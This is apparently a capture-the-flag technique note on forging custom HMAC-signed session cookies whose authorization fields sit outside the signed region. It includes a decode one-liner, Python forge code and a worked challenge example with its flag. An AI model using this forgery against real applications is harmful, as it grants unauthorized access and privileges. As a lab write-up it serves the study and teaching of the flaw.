# Custom HMAC-Signed Session — Unsigned Trusted Field

## Pattern
A home-grown session format: JSON blob in a cookie, HMAC over only PART of it.
The server checks the MAC (broken-HMAC -> rejected) but decides authorization
from a field OUTSIDE the signed envelope ("trust, but never verify").

Typical shape:
```json
{"signed":{"user_id":690,"exp":1786818570},"meta":{},"hmac":"<hex>"}
```
HMAC covers `signed` only. `meta` (and any top-level claim) is trusted verbatim.

## Decode
```bash
python3 -c "import base64,json,sys; t=sys.argv[1]; t+='='*(-len(t)%4); print(json.loads(base64.urlsafe_b64decode(t)))" "$COOKIE"
```
If it base64-decodes to JSON (not a dotted JWT), it's a custom blob — inspect which
object the hmac actually covers.

## Forge (no key needed)
Copy the hmac, inject the authz claim into the UNSIGNED region, re-encode:
```python
import json,base64
o=json.loads(base64.urlsafe_b64decode(cookie+"="*(-len(cookie)%4)))
o["meta"]["plan_tier"]="enterprise"; o["meta"]["is_verified"]=True
forged=base64.urlsafe_b64encode(json.dumps(o).encode()).rstrip(b"=").decode()
```
Reusable: `scripts/forge_custom_session.py --cookie "$COOKIE" --inject meta.plan_tier=enterprise --inject meta.is_verified=true`

## Verification matrix (proves the bug, not an open endpoint)
| Cookie | /premium/flag result |
|---|---|
| none | 401 authentication required |
| normal free | 403 enterprise plan with verified account required |
| forged (meta flipped, hmac same) | 200 + flag |
| broken hmac on signed body | error "invalid session cookie" (MAC check is real) |

## Pitfalls
- Don't crack the HMAC — you're not forging the MAC, you're abusing a field it
  doesn't cover.
- Test every plausible unsigned location: top-level, `meta`, `claims`, `extra`,
  `ctx`. `whoami` may read plan from DB by user_id (ignores your injection) while
  the premium route reads `meta`.
- Find the gated route surgically: curated plan/flag/enterprise/premium/admin names
  beat a 50k wordlist on a single challenge app.

## Worked example (CTF ch15 "Trust, but Never Verify")
- Backend: Go net/http (root 404 "404 page not found", `//` collapse in ServeMux).
- Routes: /healthz, /render (SSRF, unused), /api/signup, /api/login, /api/whoami,
  /premium/flag.
- Signup -> cookie. whoami shows plan_tier=free, is_verified=false.
- Inject meta.plan_tier=enterprise + meta.is_verified=true, reuse hmac.
- whoami now returns enterprise/verified; /premium/flag returns the flag.
- Flag: FLAG{t4qjpc_jkjvhv_adlwnl}  (CTF artifact, not durable)
